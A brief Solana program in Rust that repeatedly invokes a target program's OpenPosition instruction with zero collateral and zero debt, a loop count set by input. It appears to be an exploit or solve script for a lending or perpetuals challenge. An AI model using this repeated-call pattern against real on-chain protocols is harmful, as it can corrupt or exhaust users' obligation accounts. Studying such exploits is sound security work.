use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::invoke,
    pubkey::Pubkey,
};

entrypoint!(process);

fn process(_program_id: &Pubkey, accounts: &[AccountInfo], data: &[u8]) -> ProgramResult {
    let count = u32::from_le_bytes(data[0..4].try_into().unwrap());

    let it = &mut accounts.iter();
    let target = next_account_info(it)?;
    let market = next_account_info(it)?;
    let obligation = next_account_info(it)?;
    let owner = next_account_info(it)?;

    // perp_guard Ix::OpenPosition { collateral: 0, debt: 0 } -> variant 3, two u64 zeros
    let mut ix_data = vec![3u8];
    ix_data.extend_from_slice(&0u64.to_le_bytes());
    ix_data.extend_from_slice(&0u64.to_le_bytes());

    let ix = Instruction {
        program_id: *target.key,
        accounts: vec![
            AccountMeta::new_readonly(*market.key, false),
            AccountMeta::new(*obligation.key, false),
            AccountMeta::new_readonly(*owner.key, true),
        ],
        data: ix_data,
    };
    let infos = [target.clone(), market.clone(), obligation.clone(), owner.clone()];

    for _ in 0..count {
        invoke(&ix, &infos)?;
    }
    Ok(())
}
